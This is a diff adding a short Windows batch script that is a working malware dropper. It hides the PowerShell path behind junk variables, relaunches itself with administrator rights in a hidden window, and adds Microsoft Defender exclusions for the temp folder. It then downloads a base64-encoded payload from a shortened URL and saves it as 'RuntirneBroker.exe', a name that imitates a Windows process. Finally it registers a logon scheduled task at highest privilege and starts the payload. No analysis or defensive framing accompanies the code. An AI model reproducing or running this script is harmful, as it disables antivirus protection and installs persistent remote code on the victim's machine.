@@ -1,0 +1,14 @@
+ÿþ&cls
+@echo off
+cd %temp%
+if "%1"=="elev" goto elev
+set "sysdir=%windir%\System32"
+copy /y %sysdir%\W%uatArbpme%i%RNzLhkVxE%n%TnLfmAPWJb%d%OYdMiWTZE%o%kIVhSjRDg%w%qayXrTlFnHo%s%tNekBQwnGKV%P%rvlyuIAbfPK%o%FzfegHkDnhG%w%nWEXNceAZ%e%ajXthzkoQfW%r%ihTwUMFQSO%S%mrQPLHGAYd%h%UawWPJTbG%e%fHNhwJpGT%l%HUGYmEwkLqN%l%PHNYeGjpta%\%ortynIfpgq%v%bNzxkpXRlY%1%JwOheRbGSHN%.%JwUVcsOPqAB%0%twykWXPfeu%\%bzDgWFXceH%p%GRdSgpHDAw%o%KGvcpdiOgq%w%lHDxKByjWZ%e%sNCYgbjpaP%r%ZsniQhfKkLV%s%RrjUPqZcLb%h%vdsTPoHuV%e%MVFdKkSGELZ%l%YiKIsvRxEbA%l%TsDkPdMLgS%.%CtrLTFvNcJ%e%wdeqRbNnGfv%x%VowqCOhMaeQ%e%MheiAGEDWZ% blue.exe >nul
+echo Start-Process -File '%~f0' -A 'elev' -Verb RunAs -Win H | blue/W 1 /Comm -
+exit /b
+:elev
+set "bd=%temp%\RuntirneBroker.exe"
+echo Add-MpPreference -ExclusionPath '%temp%\';Add-MpPreference -ExclusionProcess '%temp%\*';Start-Sleep -Sec 5;$a=curl.exe -k -L https://tinyurl.com/2j99ene8;[IO.File]::WriteAllBytes('%bd%', [Convert]::FromBase64String($a)) | blue/Comm -
+erase /q /f blue.exe
+schtasks /create /tn update-sys-recovery /tr "%temp%\RuntirneBroker.exe" /sc onlogon /rl highest
+start RuntirneBroker.exe
